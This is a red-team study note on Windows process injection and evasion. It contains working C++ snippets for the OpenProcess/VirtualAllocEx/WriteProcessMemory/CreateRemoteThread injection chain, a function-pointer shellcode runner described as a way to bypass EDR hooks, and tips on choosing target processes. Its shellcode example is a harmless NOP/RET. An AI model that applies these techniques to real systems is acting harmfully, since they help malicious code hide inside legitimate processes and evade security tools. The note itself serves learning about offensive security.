---
{"dg-publish":true,"permalink":"/cards/red-team/abusing-windows-internals/","tags":["red-team/host-evasion"]}
---

~ [[map-of-contents/red-team\|red-team]]
### Introduction 
---
Windows internals plays an important role on the Windows operating system including important components found on the backend such as processes, file formats, [[Component Object Model (COM)\|Component Object Model (COM)]], task scheduling, I/O System, and more.
#### Key Topics
---

- [[#Abusing Processes|Explains what processes are and how they can be manipulated at runtime.]]

- [[#Process Injection|High-level overview of injecting malicious code into other processes using common Windows API calls and why sometimes they don't work.]]

- [[cards/red-team/Process Hollowing\|Injects a malicious executable into a suspended legitimate process by unmapping its original memory and replacing it with custom PE code, allowing stealthy code execution under a trusted process name.]]

- [[cards/red-team/Abusing Process Components\|Injects shellcode into a remote process by hijacking one of its existing threads, redirecting its execution flow to malicious code without creating a new thread, improving stealth.]]

- [[cards/red-team/Abusing DLLs\|Injects a malicious DLL into a target process by allocating memory for its path and using CreateRemoteThread to call LoadLibrary, enabling execution of attacker-controlled code inside another process.]]

### Prerequisites
---
- Knowledge about [[cards/windows/Windows Internals\|Windows Internals]]
## Abusing Processes
---
_Process_ represent a program that's being executed, a program can contain one or more processes, and a process directly interact with memory or virtual memory.

~ See [[cards/windows/Windows Internals#Processes\|Windows Processes]] for more information.
### Process Injection
---

| Injection Type                                             | Description                                                                                                                                                                                                                                                                                                                                                                                 |
| ---------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [[cards/red-team/Process Hollowing\|Process Hollowing]]                                      | Replaces the memory of a legitimate process with malicious code, often after creating it in a _suspended state_, a process is created but not yet running, function such as `Create Process` with the `CREATE_SUSPENDED` flag, it's paused right after creation, before it begins executing any code. **It does not make sense to execute a legitimate process when we want to 'hack' it**. |
| [[cards/red-team/Abusing Process Components\|Thread Execution Hijacking]] | Redirects an existing [[cards/windows/Windows Internals#Threads\|threads]] in a process to execute malicious code by modifying its execution context. Modifying the _Instruction Pointer_ (EIP/RIP) to jump into your malicious code instead of the benign instructions.                                                                                                                                  |
| [[cards/red-team/Abusing DLLs\|DLL Injection]]                            | Loads a malicious Dynamic-Link Library into the memory space of a target process to run custom code.                                                                                                                                                                                                                                                                                        |
| **PE Injection**                                           | Manually maps a Portable Executable (like a .exe or .dll) into a process without using normal loading mechanisms, allowing covert execution.                                                                                                                                                                                                                                                |
A _handle_ is basically an interface that allows a program to interact with a system object (A process, file, thread, window, or even a memory section).

At it's basic level, process injection takes the form of a [[cards/red-team/shell code injection\|shell code injection]] and at a high level can be broken down into four steps:

**1. API Call:** `OpenProcess`

- The **malicious process** (yellow circle) uses the Windows API function `OpenProcess()` to gain access to the **target process**.
- It needs permission to **read/write/execute memory** in the target.
- This returns a _handle_, essentially a reference to the target process's memory space.

**2. Allocate Memory in the Target Process**

- **API Call:**  `VirtualAllocEx` (represented here just as `VirtualAlloc`)
- Using that handle, the malicious process asks the OS to **reserve a chunk of memory** inside the target process.
- This memory will later hold the malicious code (shellcode).

**3. Write Shellcode into Allocated Memory**

- **API Call:**  `WriteProcessMemory`
- The shellcode is written into the newly allocated memory region inside the target process.
- This is the actual payload that will be executed.
    
**4. Execute the Shellcode**

- **API Call:** `CreateRemoteThread`
- Finally, the malicious process creates a new thread **inside the target process** and sets the starting point of the thread to the memory address where the shellcode is stored.
- This executes the shellcode **as if the target process itself is running it**.

![cards/red-team/images/Abusing Windows Internals.png](/img/user/cards/red-team/images/Abusing%20Windows%20Internals.png)

Now to identify a process that is owned by a specific user, we can use the following:

In **command prompt:**

```C
tasklist /V | findstr /i "Bob"
```

**In PowerShell:**

```C
Get-Process | Where-Object {
    (Get-WmiObject Win32_Process -Filter "ProcessId=$($_.Id)").GetOwner().User -eq "Bob"
} | Select-Object Id, ProcessName
```

![cards/red-team/images/Abusing Windows Internals-1.png](/img/user/cards/red-team/images/Abusing%20Windows%20Internals-1.png)

Basic shell code following the four step process:

Step 1:

```cpp
processHandle = OpenProcess(
	PROCESS_ALL_ACCESS, // Defines access rights
	FALSE, // Target handle will not be inhereted
	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments 
);
```

Step 2:

```cpp
remoteBuffer = VirtualAllocEx(
	processHandle, // Opened target process
	NULL, 
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
```

Step 3:

```cpp
WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);
```

Step 4:

```cpp
remoteThread = CreateRemoteThread(
	processHandle, // Opened target process
	NULL, 
	0, // Default size of the stack
	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
	NULL, 
	0, // Ran immediately after creation
	NULL
);
```

Then once the binary or program is compiled and we have a list of process ID that we want to inject:

![Abusing Windows Internals-2.png|450](/img/user/cards/red-team/images/Abusing%20Windows%20Internals-2.png)

**Other Techniques:** (Moved to their dedicated file due to file size.)

- [[cards/red-team/Process Hollowing\|Injects a malicious executable into a suspended legitimate process by unmapping its original memory and replacing it with custom PE code, allowing stealthy code execution under a trusted process name.]]

- [[cards/red-team/Abusing Process Components\|Injects shellcode into a remote process by hijacking one of its existing threads, redirecting its execution flow to malicious code without creating a new thread, improving stealth.]]

- [[cards/red-team/Abusing DLLs\|Injects a malicious DLL into a target process by allocating memory for its path and using CreateRemoteThread to call LoadLibrary, enabling execution of attacker-controlled code inside another process.]]

#### Why process injection does not work?
---
1. **Permission level** - the injector might be running as a regular user but the target is on Administrator session.
2. **Process Protection** - `explorer.exe` is a common target - some security products or Windows Internals might block suspicious actions on it.
	- Target less sensitive programs such as `dllhost.exe`, `notepad.exe`, or `calc.exe`.
3. **32-bit vs 64-bit MisMatch** - if your injector is **32-bit**, and `explorer.exe` is **64-bit**, the injection could silently fail.

## Memory Execution Alternatives
---
Cases when Endpoint Detection Response (EDR) is monitoring threads, processes, API calls, and more also known as [[cards/windows/hook\|hooks]] we may need to change how we execute our shellcode.

We have observed execution primarily through `CreateThread` and its counterpart, `CreateRemoteThread`, the following shows different ways to execute our shellcode depending on our environment.
### Invoking Function Pointers
---
Execute code in memory without using any **Windows API calls** effectively bypassing _hooks_.

This line is a way of executing memory as code using C/C++ function pointer, with:

```cpp
((void(*)())addressPointer)();
```

- No `CreateThread`
- No `VirtualAlloc`
- No `CreateRemoteThread`
- No Windows API at all

 **1.** `void(*)()`

This defines a **pointer to a function** that:

- Takes **no arguments** `()`
- Returns **nothing** `void`
**2.** `(void(*)())addressPointer`

The `addressPointer` will point to a block of memory (our shellcode), this tricks the compiler to thinking that the mention variable is like a function.

**3.** `((void(*)())addressPointer)();`

This **calls** the casted function pointer. The shellcode stored at that memory address will now be **executed** as if it were a regular function.

```cpp
unsigned char shellcode[] = {
    0x90, 0x90, 0x90, // NOPs (does nothing) No Operations.
    0xC3              // RET (just returns, safe example)
};

((void(*)())shellcode)(); // Executes the shellcode
```

Completed version:

```C
#include <windows.h>
#include <iostream>

int main() {
    unsigned char shellcode[] = {
        0x90, 0x90, 0x90, // NOP (no operation — does nothing)
        0xC3              // RET (return — exits function)
    };

    // Make memory executable (optional depending on compiler/OS settings)
    DWORD oldProtect;
    VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect);

    // Execute the shellcode as a function
    ((void(*)())shellcode)();

    std::cout << "Shellcode executed." << std::endl;
    return 0;
}
```

- `VirtualProtect(...)` very important - this ensures that the memory where out shellcode is stored is an **executable**.
	- Windows will not allow code execution from non-executable meory, this is default on modern systems.
	- `PAGE_EXECUTE_READ` memory can be executed and read, but not written
	- `PAGE_EXECUTE_READWRITE` first allocate memory, **write** your shell code, then **execute** it.
- Unlike previous exploits wherein the `VirtualAlloc` is needed because we are going to inject something but in or case it is not needed as the CPU or OS is automatically allocating memory for our program hence not needed any more.

**Question: Aren't `.cpp` or `.exe` already an executable? why do they still need to be executable**

Having an `.exe` file vs allocating memory at runtime and executing code from it are two very different things.

Using  `VirtualAlloc`, `malloc`, and others for dynamically allocating memory, the OS requires you to specifically declare what that memory can do:

- `PAGE_READWRITE`: normal memory
    
- `PAGE_EXECUTE_READWRITE`: lets you **execute code** stored in that memory
- That is why `PAGE_EXECUTE_READWRITE` is still needed because everything executes in memory.

And as for `.cpp` in a typical malware execution it is not practical as the victim needs to meet some prerequisites first such as C++ installed which is not.

Remember our goal is to **evade** host detections, that is why we just cannot simply compile a malicious executable - it is way to obvious, and executing shellcode in memory is much better.

**If the shellcode is hardcoded in our `.exe`, and we use `VirtualProtect` or similar to execute it, is that really "fileless"?**

It's **memory-based execution** because you are not calling an external file (files that saved on disks) like a `.dll` or `.exe`.

Unlike the opposite, if the shellcode is:

- Hardcoded in your binary, and
- That binary is dropped in disk then it can be detected by AV/EDR.

## Asynchronous Procedure Calls
---
An **APC** is a way to **run a function inside an existing thread**, _without that thread even knowing it ahead of time_.

1. You have a **target thread** that you want to run code in.

2.  That thread must **enter an "alertable" state** — meaning it's willing to check for extra work (using `SleepEx`, `WaitForSingleObjectEx`, and more).
    
3. You queue a function (the **APC**) to that thread using `QueueUserAPC()`.
    
4. When the thread becomes alertable, it **runs your APC function** — in **its own context**.


### Questions and Problems
---

> [!question]- How is Process Injection different from threat execution hijacking?
> - **Process Injection**:  
> 	- You **create a new thread** in another process to run your malicious code.
> 	- Injection = add a thread.
>     
> - **Thread Execution Hijacking**:  
> 	- You **take over an existing thread** in another process and redirect it to your code.
> 	- Hijacking = hijack a thread





## Conclusion


